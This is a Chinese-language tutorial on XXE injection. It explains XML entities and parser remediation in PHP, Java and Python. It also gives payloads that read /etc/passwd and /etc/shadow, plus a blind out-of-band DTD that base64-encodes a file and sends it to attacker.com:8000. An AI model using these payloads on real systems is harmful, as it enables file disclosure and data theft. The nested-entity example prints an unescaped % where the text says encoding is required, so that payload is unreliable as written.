## 概述 (Overview)

XXE (XML External Entity Injection) 是一种 Web 安全漏洞，发生在应用程序解析 XML 输入时，没有安全地处理 **外部实体 (External Entities)** 的引用。攻击者可以通过构造恶意的 XML 数据，强制 XML 解析器去访问服务器本地文件、内部网络资源，或者执行其他非预期的操作，导致信息泄露、服务拒绝 (DoS)、服务器端请求伪造 (SSRF) 等。

**触发条件 (PHP 示例)**:
*   使用的 `libxml` 库版本低于 2.9.1 (较老版本默认启用外部实体加载)。
*   或者，代码中显式设置了 `libxml_disable_entity_loader(FALSE);` (即禁用了禁用外部实体加载的功能)。

**学习参考**: [先知社区 - XXE 漏洞利用技巧](https://xz.aliyun.com/t/3357)

## XML 与 DTD 基础知识 (XML and DTD Basics)

### XML 文档结构 (XML Document Structure)

XML (Extensible Markup Language) 被设计用来传输和存储数据，其关键结构特点包括：

*   必须有且仅有一个根元素。
*   所有元素必须有关闭标签 (`<tag>...</tag>` 或 `<tag/>`)。
*   标签对大小写敏感。
*   元素必须正确嵌套。
*   属性值必须使用引号包围 (`attribute="value"`)。

### DTD (文档类型定义 - Document Type Definition)

DTD 用于定义 XML 文档的结构和合法元素/属性，相当于 XML 的“模式”或“语法规则”。DTD 可以：

*   **嵌入在 XML 文档内部 (Internal DTD)**
*   **存放在独立的外部文件中 (External DTD)**

**DTD 引用方式**:

1.  **内部声明**:
    ```xml
    <!DOCTYPE rootElement [
      <!-- DTD 元素和实体声明放在这里 -->
    ]>
    <rootElement>...</rootElement>
    ```
2.  **外部引用 (私有 DTD)**:
    ```xml
    <!DOCTYPE rootElement SYSTEM "path/to/your.dtd">
    <rootElement>...</rootElement>
    ```
3.  **外部引用 (公共 DTD)**:
    ```xml
    <!DOCTYPE rootElement PUBLIC "publicIdentifier" "uri/to/public.dtd">
    <rootElement>...</rootElement>
    ```

**DTD 参考**: [W3School DTD 教程](http://www.w3school.com.cn/dtd/index.asp)

### XML 实体 (XML Entities)

实体是 XML 中用来表示变量或引入外部内容的机制。

*   **内部实体 (Internal Entity)**:
    *   **定义**: 在 DTD 内部定义，其值是一个固定的字符串。
    *   **语法**: `<!ENTITY entityName "entityValue">`
    *   **示例**:
        ```xml
        <!DOCTYPE foo [
          <!ENTITY companyName "MyCorp">
        ]>
        <company>&companyName;</company> <!-- 使用时用 &entityName; -->
        ```

*   **外部实体 (External Entity)**:
    *   **定义**: 引用存储在 XML 文档外部的资源，其值由外部资源的内容决定。需要使用 `SYSTEM` 关键字指定资源的 URI。
    *   **语法**: `<!ENTITY entityName SYSTEM "URI">`
    *   **示例**:
        ```xml
        <!DOCTYPE foo [
          <!ENTITY externalContent SYSTEM "file:///path/to/data.txt">
          <!-- 或者 SYSTEM "http://example.com/data.xml" -->
        ]>
        <data>&externalContent;</data>
        ```
    *   **XXE 漏洞的核心**: XML 解析器在处理外部实体时，会根据 URI 指定的协议 (如 `file://`, `http://`, `ftp://`) 去访问资源。如果 URI 可控，攻击者就能让服务器访问任意文件或网络资源。

*   **通用实体 (General Entity)**:
    *   **定义**: 使用 `<!ENTITY ...>` 定义。
    *   **引用**: 只能在 **XML 文档内容** 中使用 `&entityName;` 引用。
    *   **示例 (用于 XXE)**:
        ```xml
        <!DOCTYPE attack [
          <!ENTITY fileContent SYSTEM "file:///etc/passwd">
        ]>
        <profile>
          <description>&fileContent;</description>
        </profile>
        ```

*   **参数实体 (Parameter Entity)**:
    *   **定义**: 使用 `<!ENTITY % ...>` 定义 (注意 `%` 号)。
    *   **引用**: 只能在 **DTD 内部** 使用 `%entityName;` 引用。
    *   **用途**: 常用于组织和重用 DTD 结构，但在 XXE 中，特别是在 Blind XXE 场景下，参数实体是实现 **带外数据 (Out-of-Band, OOB) 交互** 的关键。参数实体可以引用外部 DTD 文件。
    *   **语法**:
        ```dtd
        <!ENTITY % parameterEntityName "entityValue">
        <!ENTITY % parameterEntityName SYSTEM "URI">
        ```
    *   **示例 (用于 XXE 引入外部 DTD)**:
        ```xml
        <!DOCTYPE foo [
          <!ELEMENT foo ANY >
          <!ENTITY % remoteDTD SYSTEM "http://attacker.com/evil.dtd"> <!-- 定义并请求外部DTD -->
          %remoteDTD; <!-- 在DTD内部引用参数实体，会执行evil.dtd的内容 -->
        ]>
        <foo>&contentFromEvilDTD;</foo> <!-- 引用在evil.dtd中定义的通用实体 -->
        ```
        **`evil.dtd` 文件内容示例:**
        ```dtd
        <!ENTITY contentFromEvilDTD SYSTEM "file:///etc/shadow">
        ```

## 寻找与利用 XXE 漏洞 (Finding and Exploiting XXE)

### 如何寻找 XXE 漏洞 (Finding XXE Vulnerabilities)

1.  **检查 `Content-Type`**: 观察 HTTP 请求头中的 `Content-Type`。如果请求体是 XML 格式 (`application/xml`, `text/xml` 等)，则可能存在 XXE。
2.  **检查 `Accept` 头**: 即使请求体不是 XML，如果响应头中的 `Accept` 包含 `application/xml` 或 `text/xml`，表明服务器可能能够处理 XML。尝试修改请求的 `Content-Type` 为 `application/xml` 并发送 XML payload。
3.  **修改 JSON 为 XML**: 如果接口接收 JSON (`application/json`)，尝试将 `Content-Type` 修改为 `application/xml`，并将 JSON 数据转换为等效的 XML 结构，然后注入 XXE payload 进行测试。
4.  **文件上传**: 检查处理 XML 文件上传的功能（如 `.docx`, `.xlsx`, `.pptx`, `.svg`, `.xml` 等）。

### XXE 利用场景 (Exploitation Scenarios)

XXE 利用主要分为两大类：

*   **有回显 (In-band XXE)**: 攻击者可以直接在应用程序的 HTTP 响应中看到注入的外部实体内容（例如，文件内容或错误信息）。
*   **无回显 (Out-of-band XXE / Blind XXE)**: 应用程序处理了外部实体，但其内容并未直接显示在响应中。需要利用带外通道（如向攻击者控制的服务器发送 HTTP 请求）来提取数据。

#### 有回显 XXE (Exploiting XXE with Direct Feedback)

*   **利用通用实体读取文件**:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ELEMENT foo ANY>
      <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!-- 定义外部实体指向目标文件 -->
    ]>
    <foo>&xxe;</foo> <!-- 在XML内容中引用实体 -->
    ```
    *   如果应用将 `<foo>` 标签的内容回显，则 `/etc/passwd` 的内容会被显示。

*   **利用参数实体读取文件 (需要 DTD 支持)**:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ELEMENT foo ANY>
      <!ENTITY % dtdFile SYSTEM "http://attacker.com/evil.dtd"> <!-- 加载外部DTD -->
      %dtdFile; <!-- 执行外部DTD内容 -->
    ]>
    <foo>&fileContent;</foo> <!-- 引用在evil.dtd中定义的实体 -->
    ```
    **`evil.dtd` 文件内容:**
    ```dtd
    <!ENTITY fileContent SYSTEM "file:///etc/passwd">
    ```

#### 无回显 / 盲 XXE (Exploiting Blind XXE using Out-of-Band Techniques)

当无法直接看到回显时，需要构造一个能将数据发送到攻击者控制的服务器的 payload。这通常需要嵌套使用参数实体。

*   **原理**:
    1.  定义一个参数实体 (`%remote`) 指向攻击者服务器上的外部 DTD 文件 (`attack.dtd`)。
    2.  在 `attack.dtd` 中：
        *   定义另一个参数实体 (`%file`) 读取目标文件（可能需要用 `php://filter` 编码）。
        *   定义第三个参数实体 (`%send`)，它的 **值** 是一个 **新的 `<!ENTITY>` 声明**。这个新的 `<!ENTITY>` 声明会构造一个 URL，将 `%file` 实体的内容作为参数拼接到 URL 中，并指向攻击者控制的服务器。
    3.  在原始 XML 中按顺序引用 `%remote; %int; %send;` (这里的 `%int` 是在 `attack.dtd` 中定义的)。这会触发链式解析：加载外部 DTD -> 读取文件 -> 构造带数据的 URL -> 发起 HTTP 请求。

*   **Payload 示例**:
    **发送到目标服务器的 XML:**
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE data [
      <!ENTITY % remote SYSTEM "http://attacker.com/attack.dtd">
      %remote;
      %int;
      %send;
    ]>
    <data>some data</data>
    ```
    **攻击者服务器上的 `attack.dtd` 文件内容:**
    ```dtd
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini">
    <!ENTITY % int "<!ENTITY % send SYSTEM 'http://attacker.com:8000/?data=%file;'>">
    ```
    *   `%file`: 读取目标文件并进行 Base64 编码 (防止特殊字符破坏 XML 结构)。
    *   `%int`: 定义了一个嵌套的实体声明。当 `%int;` 被解析时，它会定义 `%send`。
    *   `%send`: 其 `SYSTEM` URI 包含了 `%file;` 的内容作为查询参数 `data` 的值，并指向攻击者的 HTTP 服务器 (端口 8000)。
    *   **注意**: 在 `%int` 的值中，内部的 `%` 需要进行 HTML 实体编码 `%` (或 `%25`)，因为在一个实体的值中不能直接出现 `%`。

*   **执行流程**:
    1.  `%remote;` 被解析，请求并加载 `http://attacker.com/attack.dtd`。
    2.  `%int;` 被解析，定义了 `%send` 实体，此时 `%file;` 也被解析，读取并编码了 `win.ini` 的内容。
    3.  `%send;` 被解析，向 `http://attacker.com:8000/?data=<base64_encoded_content>` 发起 HTTP 请求。
    4.  攻击者查看其 HTTP 服务器 (端口 8000) 的访问日志，找到包含 `data=` 的请求，解码 Base64 内容即可获得 `win.ini` 的内容。

*   **查看数据**:
    *   如果服务器有详细的报错信息，有时数据会泄露在错误消息中。
    *   主要通过查看攻击者控制的服务器（HTTP 或 DNS Log）的访问日志来获取外带的数据。

## XXE 漏洞修复与防御 (Remediation and Defense)

防御 XXE 的核心是禁用或安全地配置 XML 解析器的外部实体处理功能。

1.  **禁用外部实体解析 (首选方法)**:
    *   **PHP**:
        ```php
        // 推荐：在解析前调用此函数 (libxml >= 2.9.0)
        libxml_disable_entity_loader(true);
        // 如果使用 SimpleXML
        $xml = simplexml_load_string($xml_data, 'SimpleXMLElement', LIBXML_NOENT); // LIBXML_NOENT 会解析实体，是 不 安全的
        $xml = simplexml_load_string($xml_data, 'SimpleXMLElement', LIBXML_NONET); // 加上 LIBXML_NONET 禁用网络访问
        ```
    *   **Java (JAXP - DocumentBuilderFactory)**:
        ```java
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // 禁用外部实体 (最关键)
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // 禁止 DOCTYPE 声明
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false); // 禁止外部通用实体
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false); // 禁止外部参数实体
        // 禁用外部 DTD 加载
        dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        // 关闭 XInclude 支持
        dbf.setXIncludeAware(false);
        dbf.setExpandEntityReferences(false); // 不展开实体引用
        ```
    *   **Python (lxml)**:
        ```python
        from lxml import etree
        # resolve_entities=False 禁用实体解析
        xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities=False))
        ```
    *   **其他语言/库**: 查阅相应库的文档，寻找禁用外部实体 (External Entities)、禁止 DOCTYPE 声明 (`disallow-doctype-decl`)、禁用外部 DTD 加载 (`load-external-dtd`) 的选项。

2.  **升级依赖库**: 确保使用的 XML 解析库是最新版本，因为较新版本可能默认禁用了不安全的特性或修复了相关漏洞 (如 PHP `libxml >= 2.9.1`)。

3.  **过滤和验证 (不推荐作为主要手段)**:
    *   **黑名单过滤**: 尝试过滤 `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC` 等关键字。 **极其不推荐**，很容易被各种编码或技巧绕过。
    *   **输入验证**: 如果可能，对 XML 数据进行严格的结构和内容验证，但这通常无法完全阻止 XXE。

**最佳实践**: 优先选择完全禁用外部实体和 DOCTYPE 声明的配置。